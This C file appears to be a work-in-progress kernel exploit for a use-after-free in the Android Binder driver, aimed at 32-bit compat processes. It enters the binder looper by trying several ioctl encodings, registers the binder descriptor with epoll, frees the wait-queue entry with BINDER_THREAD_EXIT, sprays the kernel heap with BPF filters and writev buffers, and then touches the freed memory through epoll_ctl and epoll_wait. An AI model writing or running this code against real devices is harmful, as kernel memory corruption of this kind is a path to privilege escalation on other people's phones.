/*
 * compat_binder_uaf2.c — 32-bit Binder UAF v2, fixing looper entry
 *
 * Compile: arm-linux-musleabihf-gcc -static -O2 -o compat_binder_uaf2 compat_binder_uaf2.c -lpthread
 *
 * v1 had ENTER_LOOPER returning -1 because binder_write_read
 * 32-bit struct wasn't being handled correctly by the compat ioctl.
 *
 * This version:
 * 1. Diagnoses the exact binder_write_read failure
 * 2. Tries both compat and native ioctl encodings
 * 3. Uses the working approach for the full UAF trigger
 * 4. Adds memory readback to detect actual reclamation
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <stdint.h>

/* Binder constants */
#define BC_ENTER_LOOPER         13
#define BC_EXIT_LOOPER          14
#define BC_FREE_BUFFER          6

struct binder_version {
    int32_t protocol_version;
};

/*
 * On 32-bit, the kernel's binder_write_read uses binder_uintptr_t
 * which is __u64 always (NOT pointer-sized). So on 32-bit, the struct
 * still has 64-bit fields for buffer pointers!
 */
struct binder_write_read_compat {
    int64_t write_size;      /* binder_size_t = __u64 */
    int64_t write_consumed;  /* binder_size_t = __u64 */
    uint64_t write_buffer;   /* binder_uintptr_t = __u64 */
    int64_t read_size;
    int64_t read_consumed;
    uint64_t read_buffer;
};

/* ioctl numbers — computed with correct struct sizes */
/* BINDER_WRITE_READ: _IOWR('b', 1, binder_write_read) */
/* With 48-byte struct (6×8): 0xc0306201 on 32-bit with __u64 fields */
/* With 24-byte struct (6×4): 0xc0186201 — wrong for this kernel */

/* Let the compiler compute the right ioctl number */
#define BINDER_WRITE_READ_COMPAT  _IOWR('b', 1, struct binder_write_read_compat)
#define BINDER_SET_MAX_THREADS    _IOW('b', 5, uint32_t)
#define BINDER_VERSION            _IOWR('b', 9, struct binder_version)
#define BINDER_THREAD_EXIT        _IOW('b', 8, int32_t)

/* Also try the "wrong" struct size to see what the kernel expects */
struct binder_write_read_small {
    int32_t write_size;
    int32_t write_consumed;
    uint32_t write_buffer;
    int32_t read_size;
    int32_t read_consumed;
    uint32_t read_buffer;
};
#define BINDER_WRITE_READ_SMALL   _IOWR('b', 1, struct binder_write_read_small)

/* Hardcoded ioctl numbers from kernel source */
#define BWR_IOCTL_48  0xc0306201   /* sizeof=48 (correct __u64 fields) */
#define BWR_IOCTL_24  0xc0186201   /* sizeof=24 (wrong, 32-bit fields) */

static void hexdump(const char *label, const void *data, size_t len)
{
    const uint8_t *p = data;
    printf("  %s: ", label);
    for (size_t i = 0; i < len && i < 64; i++)
        printf("%02x", p[i]);
    printf("\n");
}

/*
 * Try to enter binder looper with different ioctl encodings
 */
static int enter_looper(int bfd)
{
    uint32_t cmd = BC_ENTER_LOOPER;
    int ret;

    /* Attempt 1: 48-byte struct (correct for __u64 binder_uintptr_t) */
    printf("  Trying 48-byte BWR (ioctl=0x%lx)...\n",
           (unsigned long)BINDER_WRITE_READ_COMPAT);
    {
        struct binder_write_read_compat bwr = {0};
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (uint64_t)(uintptr_t)&cmd;
        ret = ioctl(bfd, BINDER_WRITE_READ_COMPAT, &bwr);
        printf("    ret=%d errno=%d consumed=%lld\n",
               ret, ret < 0 ? errno : 0,
               (long long)bwr.write_consumed);
        if (ret == 0 && bwr.write_consumed > 0) {
            printf("    ENTER_LOOPER SUCCESS (48-byte)\n");
            return 0;
        }
    }

    /* Attempt 2: 24-byte struct (32-bit pointer fields) */
    printf("  Trying 24-byte BWR (ioctl=0x%lx)...\n",
           (unsigned long)BINDER_WRITE_READ_SMALL);
    {
        struct binder_write_read_small bwr = {0};
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (uint32_t)(uintptr_t)&cmd;
        ret = ioctl(bfd, BINDER_WRITE_READ_SMALL, &bwr);
        printf("    ret=%d errno=%d consumed=%d\n",
               ret, ret < 0 ? errno : 0, bwr.write_consumed);
        if (ret == 0 && bwr.write_consumed > 0) {
            printf("    ENTER_LOOPER SUCCESS (24-byte)\n");
            return 0;
        }
    }

    /* Attempt 3: hardcoded 48-byte ioctl number */
    printf("  Trying hardcoded BWR_IOCTL_48=0x%x...\n", BWR_IOCTL_48);
    {
        struct binder_write_read_compat bwr = {0};
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (uint64_t)(uintptr_t)&cmd;
        ret = ioctl(bfd, BWR_IOCTL_48, &bwr);
        printf("    ret=%d errno=%d consumed=%lld\n",
               ret, ret < 0 ? errno : 0,
               (long long)bwr.write_consumed);
        if (ret == 0 && bwr.write_consumed > 0) {
            printf("    ENTER_LOOPER SUCCESS (hardcoded 48)\n");
            return 0;
        }
    }

    /* Attempt 4: hardcoded 24-byte ioctl number */
    printf("  Trying hardcoded BWR_IOCTL_24=0x%x...\n", BWR_IOCTL_24);
    {
        struct binder_write_read_small bwr = {0};
        bwr.write_size = sizeof(cmd);
        bwr.write_buffer = (uint32_t)(uintptr_t)&cmd;
        ret = ioctl(bfd, BWR_IOCTL_24, &bwr);
        printf("    ret=%d errno=%d consumed=%d\n",
               ret, ret < 0 ? errno : 0, bwr.write_consumed);
        if (ret == 0 && bwr.write_consumed > 0) {
            printf("    ENTER_LOOPER SUCCESS (hardcoded 24)\n");
            return 0;
        }
    }

    printf("  ALL ENTER_LOOPER ATTEMPTS FAILED\n");
    return -1;
}

/*
 * Full UAF trigger with proper looper entry
 */
static void do_uaf_round(int round, int bfd, void *bmap)
{
    printf("\n--- Round %d ---\n", round);

    /* Enter looper */
    int looper_ok = enter_looper(bfd);

    /* Set up epoll BEFORE thread exit */
    int epfd = epoll_create(1);
    if (epfd < 0) {
        printf("  epoll_create: FAIL\n");
        return;
    }

    struct epoll_event ev = {
        .events = EPOLLIN,
        .data = { .fd = bfd }
    };
    int ret = epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    printf("  epoll_ctl ADD: %s (errno=%d)\n",
           ret == 0 ? "OK" : "FAIL", ret < 0 ? errno : 0);

    if (ret < 0) { close(epfd); return; }

    /* THREAD_EXIT — this is what frees the wait_queue entry */
    printf("  >>> BINDER_THREAD_EXIT <<<\n");
    int32_t dummy = 0;
    ret = ioctl(bfd, BINDER_THREAD_EXIT, &dummy);
    printf("  ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);

    /* Massive spray with multiple types */
    printf("  --- Spray phase ---\n");

    /* BPF spray — 4 instructions × 8 bytes = 32 bytes per filter */
    struct {
        uint16_t code; uint8_t jt, jf; uint32_t k;
    } insns[4] = {
        { 0x06, 0, 0, 0xFFFF },
        { 0x06, 0, 0, 0xFFFF },
        { 0x06, 0, 0, 0xFFFF },
        { 0x06, 0, 0, 0xFFFF },
    };
    struct { uint16_t len; void *filter; } prog;
    prog.len = 4;
    prog.filter = insns;

    int bpf_socks[500];
    int bpf_cnt = 0;
    for (int i = 0; i < 500; i++) {
        bpf_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (bpf_socks[i] < 0) continue;
        if (setsockopt(bpf_socks[i], SOL_SOCKET, 26,
                       &prog, sizeof(prog)) == 0)
            bpf_cnt++;
    }
    printf("  BPF spray: %d filters\n", bpf_cnt);

    /* Writev spray — compat iovec path */
    int pipe_cnt = 0;
    for (int i = 0; i < 200; i++) {
        int pfd[2];
        if (pipe(pfd) < 0) break;
        char buf = 'A';
        struct iovec iov[4] = {
            { &buf, 1 }, { &buf, 1 }, { &buf, 1 }, { &buf, 1 }
        };
        if (writev(pfd[1], iov, 4) > 0) pipe_cnt++;
    }
    printf("  writev spray: %d\n", pipe_cnt);

    /* Trigger: touch freed memory */
    printf("  >>> epoll_ctl DEL <<<\n");
    ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, NULL);
    printf("  ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);

    /* Also try epoll_wait */
    struct epoll_event events[1];
    ret = epoll_wait(epfd, events, 1, 50);
    printf("  epoll_wait: ret=%d errno=%d\n", ret, ret < 0 ? errno : 0);

    printf("  [survived round %d]\n", round);

    close(epfd);
    for (int i = 0; i < 500; i++)
        if (bpf_socks[i] >= 0) close(bpf_socks[i]);
}

/*
 * Check if binder compat layer uses different struct layout
 */
static void probe_binder_compat(int bfd)
{
    printf("\n=== Binder Compat Struct Probing ===\n");

    printf("  sizeof(binder_write_read_compat) = %zu (expect 48)\n",
           sizeof(struct binder_write_read_compat));
    printf("  sizeof(binder_write_read_small) = %zu (expect 24)\n",
           sizeof(struct binder_write_read_small));
    printf("  BINDER_WRITE_READ_COMPAT = 0x%lx\n",
           (unsigned long)BINDER_WRITE_READ_COMPAT);
    printf("  BINDER_WRITE_READ_SMALL  = 0x%lx\n",
           (unsigned long)BINDER_WRITE_READ_SMALL);
    printf("  BWR_IOCTL_48 = 0x%x\n", BWR_IOCTL_48);
    printf("  BWR_IOCTL_24 = 0x%x\n", BWR_IOCTL_24);

    /* Also check BINDER_VERSION ioctl */
    struct binder_version ver = {0};
    printf("\n  BINDER_VERSION ioctl = 0x%lx\n",
           (unsigned long)BINDER_VERSION);
    int ret = ioctl(bfd, BINDER_VERSION, &ver);
    printf("  ret=%d ver=%d\n", ret, ver.protocol_version);

    /* Try raw read from binder — see what data comes back */
    uint8_t readbuf[256] = {0};
    struct binder_write_read_compat bwr = {0};
    bwr.read_size = sizeof(readbuf);
    bwr.read_buffer = (uint64_t)(uintptr_t)readbuf;

    printf("\n  BWR read-only (48-byte struct):\n");
    ret = ioctl(bfd, BINDER_WRITE_READ_COMPAT, &bwr);
    printf("    ret=%d errno=%d read_consumed=%lld\n",
           ret, ret < 0 ? errno : 0,
           (long long)bwr.read_consumed);
    if (bwr.read_consumed > 0) {
        hexdump("read data", readbuf, (size_t)bwr.read_consumed);
    }
}

int main(void)
{
    printf("=== 32-bit Compat Binder UAF v2 ===\n");
    printf("uid=%d pid=%d sizeof(void*)=%zu\n\n",
           getuid(), getpid(), sizeof(void *));

    signal(SIGPIPE, SIG_IGN);

    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (bfd < 0) {
        printf("FATAL: /dev/binder: %s\n", strerror(errno));
        return 1;
    }

    void *bmap = mmap(NULL, 1024 * 1024, PROT_READ,
                      MAP_PRIVATE, bfd, 0);
    printf("Binder mmap: %s (%p)\n", bmap != MAP_FAILED ? "OK" : "FAIL", bmap);

    uint32_t max_threads = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &max_threads);

    /* Probe struct layout */
    probe_binder_compat(bfd);

    /* Close and reopen for clean state */
    if (bmap != MAP_FAILED) munmap(bmap, 1024 * 1024);
    close(bfd);

    /* Run 3 UAF rounds */
    for (int i = 0; i < 3; i++) {
        bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd < 0) { printf("binder open fail\n"); continue; }

        bmap = mmap(NULL, 1024 * 1024, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); continue; }

        max_threads = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &max_threads);

        do_uaf_round(i, bfd, bmap);

        munmap(bmap, 1024 * 1024);
        close(bfd);
    }

    printf("\n=== Done (pid %d alive) ===\n", getpid());
    return 0;
}
